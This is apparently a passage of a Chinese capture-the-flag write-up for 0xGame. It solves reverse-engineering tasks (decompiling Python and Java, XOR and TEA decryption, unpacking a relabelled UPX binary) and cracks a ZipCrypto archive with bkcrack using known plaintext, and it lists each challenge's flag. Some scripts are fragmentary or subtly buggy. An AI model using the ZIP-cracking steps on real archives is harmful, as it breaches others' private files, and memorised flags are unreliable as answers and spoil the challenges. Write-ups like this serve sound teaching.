    if len(decrypted_payload) < 48: # Necesitamos al menos los 48 bytes de la flag.
         raise ValueError("El contenido descifrado es demasiado corto para contener la flag.")

    # Aislamos los bloques que deberían contener la flag con padding (los primeros 48 bytes del payload).
    padded_flag = decrypted_payload[:48]

    # Intentar quitar el padding de la parte de la flag.
    flag = unpad(padded_flag, block_size)
    
    flag_str = flag.decode()
    
    if flag_str.startswith("0xGame{") and flag_str.endswith("}"):
        print("\n" + "="*40)
        print(f"[+] ¡ÉXITO! La flag es: {flag_str}")
        print("="*40)
    else:
        print("\n[!] Se descifró un texto, pero no parece tener el formato de la flag.")
        print(f"[!] Texto obtenido: {flag_str}")


except (ValueError, IndexError) as e:
    print(f"\n[!] ERROR: No se pudo descifrar la flag. Causa probable: {e}")
    print("[!] Por favor, comprueba que has copiado el texto cifrado completo (160 caracteres hexadecimales).")
except Exception as e:
    print(f"\n[!] Ocurrió un error inesperado: {e}")
```

得到flag：`0xGame{5adccb16-92b6-4d44-89dd-c1e39f6c9338}`

# Osint

## 机场

根据橙黄色廊桥和西藏航空的飞机(Tibet Airlines)可以确定是`珠海金湾机场`，三字码是ZUH，注意这个是大写，然后用网站上的加密工具进行32位小写md5加密，得到`296d0dd1964288715beb8e2d06dca1a5`,就得到flag了。

# Reverse

## baby_python逆向

- 使用`pyinstxtractor`提取文件，运行`python pyinstxtractor.py babyPy.exe`，从.exe中提取.pyc文件(注意这个工具要和目标程序放在同一个目录下。)

- 使用`uncompyle6`反编译，`uncompyle6 babyPy.pyc > decompiled_code.py`,然后就可以在`decompiled_code.py`这个脚本里找到flag了。

- `0xGame{c2a6d59d-34dc-4b94-96aa-e823bdcb4823}`

## baby_java逆向

- `jar -tf BabyJar.jar`分析文件结构

- ```python
  # 提取所有 class 文件
  jar -xf BabyJar.jar
  
  # 使用 javap 查看字节码（基础信息）
  javap -c com/BabyJar/demo/BabyJar.class
  javap -c com/BabyJar/demo/Encrypt.class
  ```

​	查看类的基础信息。

- 找到密文`QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY=`   和   加密过程`原始flag → 每个字节 XOR 20 → 交换高低4位 → Base64编码 → 比较`

- 解密：`Base64解码 → 交换高低4位 → 每个字节 XOR 20 → 得到原始flag`

- 完整exp：

  ```python
  import base64
  
  # 硬编码的密文
  encoded = "QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY="
  
  # Base64 解码
  encrypted_bytes = base64.b64decode(encoded)
  
  # 逆向加密过程
  def decrypt(data):
      result = []
      for byte in data:
          # 1. 先交换高低4位（逆向第一步）
          swapped = ((byte & 0x0F) << 4) | ((byte & 0xF0) >> 4)
          # 2. 再与 key=20 进行 XOR（逆向第二步）
          decrypted = swapped ^ 20
          result.append(decrypted)
      return bytes(result)
  
  # 解密
  decrypted = decrypt(encrypted_bytes)
  flag = decrypted.decode('utf-8')
  print(f"Flag: {flag}")
  ```

  得到flag：`0xGame{73e214d2-d85c-4441-bc17-8e10c0e7b8c2}`.

## 16位程序与asm汇编

数据分两个循环两种加密。每23个字节为一段。

```python
# 完整加密数据
encrypted = [
    0x47, 0x7F, 0x52, 0x78, 0x6C, 0x74, 0x7E, 0x72, 0x47, 0x47,
    0x73, 0x5A, 0x84, 0x5A, 0x43, 0x85, 0x46, 0x5A, 0x83, 0x6F,
    0x46, 0x5A, 0x6C,  # 前23字节
    0x33, 0x30, 0x73, 0x32, 0x75, 0x66, 0x37, 0x61, 0x66, 0x33,
    0x30, 0x78, 0x66, 0x40, 0x35, 0x61, 0x4E, 0x64, 0x34, 0x65,
    0x32, 0x33, 0x88   # 后23字节
]

# 分开两部分
part1 = encrypted[:23]  # 循环1处理
part2 = encrypted[23:]  # 循环2处理

# 方法1：先sub 9再xor 0E (循环1)
decrypted1 = ""
for byte in part1:
    decrypted1 += chr(((byte - 9) & 0xFF) ^ 0x0E)

# 方法2：先xor 0E再sub 9 (循环2)  
decrypted2 = ""
for byte in part2:
    decrypted2 += chr(((byte ^ 0x0E) - 9) & 0xFF)

print("第一部分:", decrypted1)
print("第二部分:", decrypted2)
print("完整Flag:", decrypted1 + decrypted2)
```

逆向解密，得到：`0xGame{g00d_u_4r3_th3_m45t3r_0f_45m_E2f7a1b34}`

很好，你是汇编大师🥰🥰。

## shuffle

IDA里可以看到打乱的flag：`23-64bed6}-xm5300-{faGa34-0e04c2e7c2a78f39a4`,随机数种子1638，MSVC的标准C语言库生成的随机数，和打乱逻辑:

![shuffle](/images/wp/shuffle.png)

编写逆向脚本：

```python
 for idx in range(len(operations) - 1, -1, -1):
        i, swap_idx = operations[idx]
        arr[i], arr[swap_idx] = arr[swap_idx], arr[i]
    
    return ''.join(arr)

```

得到flag：`0xGame{5ffa9030-e204-4673-b4c6-ed433aca7228}`

## TELF

010的使用:在光标处键入数据会**自动往后覆盖**，实现替换。(或者选中某块数据然后开始键入，修改替换掉该块的数据。)注意不要删除，删了之后再键入就是继续往后覆盖数据了。这就不能实现该数据块的替换了，反而替换掉了后面不该替换的数据。**删除不要乱点！**

```python
import struct
import ctypes

libc = ctypes.CDLL('libc.so.6')  

# 定义 srand 和 rand 函数的原型
libc.srand.argtypes = [ctypes.c_uint]
libc.srand.restype = None
libc.rand.argtypes = []
libc.rand.restype = ctypes.c_int

def get_keys():
    seed = 0xF6950
    libc.srand(seed)
    keys = [(libc.rand()) for _ in range(4)]
    return keys

def decrypt(v, k):
    """
    使用 TEA 算法解密一个 64 位的数据块。
    v: 一个包含两个 32 位无符号整数的元组 (v0, v1)。
    k: 一个包含四个 32 位整数的密钥数组。
    """
    v0, v1 = v
    delta = 0x9e3779b9
    num_rounds = 32
    sum_val = (delta * num_rounds) & 0xFFFFFFFF
    for _ in range(num_rounds):
        term1 = ((v0 << 4) + k[2]) & 0xFFFFFFFF
        term2 = (v0 + sum_val) & 0xFFFFFFFF
        term3 = ((v0 >> 5) + k[3]) & 0xFFFFFFFF
        v1 = (v1 - (term1 ^ term2 ^ term3)) & 0xFFFFFFFF
        term1 = ((v1 << 4) + k[0]) & 0xFFFFFFFF
        term2 = (v1 + sum_val) & 0xFFFFFFFF
        term3 = ((v1 >> 5) + k[1]) & 0xFFFFFFFF
        v0 = (v0 - (term1 ^ term2 ^ term3)) & 0xFFFFFFFF
        sum_val = (sum_val - delta) & 0xFFFFFFFF
    return v0, v1

def main():
    enc = bytes([
        0xAD, 0xDA, 0x01, 0xDC, 0xAE, 0x5B, 0x8A, 0x08,
        0x4E, 0xF5, 0x4F, 0x8F, 0x6E, 0x5F, 0x9D, 0x9E,
        0x0A, 0x4E, 0xA9, 0x08, 0x25, 0xAB, 0x45, 0xC2,
        0x4B, 0xC9, 0x8F, 0x43, 0x3D, 0x51, 0xD6, 0x28,
        0xF6, 0x72, 0xCD, 0xF4, 0x2B, 0xB4, 0x4A, 0x3B,
        0xFB, 0x36, 0x66, 0xEF, 0xD6, 0x8A, 0x8C, 0xB2,
        0xEB, 0x1A, 0x9C, 0x1B, 0x0A, 0x9C, 0x1F, 0x53
    ])
    keys = get_keys()

    decrypted_flag = b""
    for i in range(0, len(enc), 8):
        chunk = enc[i:i+8]
        v = struct.unpack('<2I', chunk)
        decrypted_v = decrypt(v, keys)
        decrypted_chunk = struct.pack('<2I', decrypted_v[0], decrypted_v[1])
        decrypted_flag += decrypted_chunk
        flag_str = decrypted_flag.decode('utf-8').rstrip('\x00')
        print(f"{{flag_str}}")


if __name__ == "__main__":
    main()
```

首先是upx脱壳，但是upx标签被修改成了X1c，用010替换X1c为UPX然后就能脱壳了，脱完之后就能逆向了,得到:

`0xGame{PANDORA-PANRADOXXX-101AP-9CDE02B83F5D6-7B1A9C348}`  flag .

# Misc

## 明文攻击

- 先构造一个png文件，，bkcrack只需要12个字节的明文就能爆破，`89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`，文件头是这个。

- 运行`bkcrack.exe -C attachment.zip -c huiliyi.png -p 01.png`，爆破得到`cdc564be 5675041f 719adb56`密钥。

- 最后`bkcrack.exe -C attachment.zip -c flag.txt -k cdc564be 5675041f 719adb56 -d flag_decrypted.txt`得到flag
- `0xGame{Y0u_cRacked_M3!z1p_1s_uNsafe!}`
